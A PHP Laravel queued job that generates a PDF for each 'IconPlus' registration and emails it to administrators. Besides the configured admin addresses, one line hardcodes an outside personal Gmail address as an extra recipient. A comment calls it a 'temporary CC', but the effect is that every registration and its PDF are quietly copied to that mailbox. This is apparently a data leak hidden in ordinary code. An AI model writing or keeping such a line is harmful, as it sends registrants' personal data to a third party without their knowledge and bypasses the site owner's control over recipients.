<?php

namespace App\Jobs;

use App\Mail\NewIconPlusRegistrationMail;
use App\Models\IconPlusRegistration;
use App\Services\RegistrationPdfService;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\Mail;
use Throwable;

class ProcessIconPlusRegistrationSubmission implements ShouldQueue
{
    use Queueable;

    public int $tries = 2;

    public int $timeout = 180;

    public function __construct(
        public IconPlusRegistration $registration,
    ) {}

    public function handle(RegistrationPdfService $pdfService): void
    {
        $registration = $this->registration->fresh();

        if (! $registration) {
            return;
        }

        $pdfPath = null;

        try {
            $pdfPath = $pdfService->generateIconPlusPdf($registration);

            $registration->updatePersistableAttributes([
                'pdf_path' => $pdfPath,
                'pdf_status' => 'generated',
                'pdf_error' => null,
                'pdf_generated_at' => now(),
            ]);
        } catch (Throwable $exception) {
            report($exception);

            $registration->updatePersistableAttributes([
                'pdf_path' => null,
                'pdf_status' => 'failed',
                'pdf_error' => $exception->getMessage(),
                'pdf_generated_at' => null,
            ]);
        }

        $registration->refresh();

        // ponytail: temporary CC while client confirmations are paused — remove this line to stop
        $adminRecipients = [...config('admin.emails', []), 'eidddsheba@gmail.com'];

        foreach ($adminRecipients as $adminEmail) {
            Mail::to($adminEmail)->send(
                new NewIconPlusRegistrationMail($registration, $pdfPath)
            );
        }
    }
}
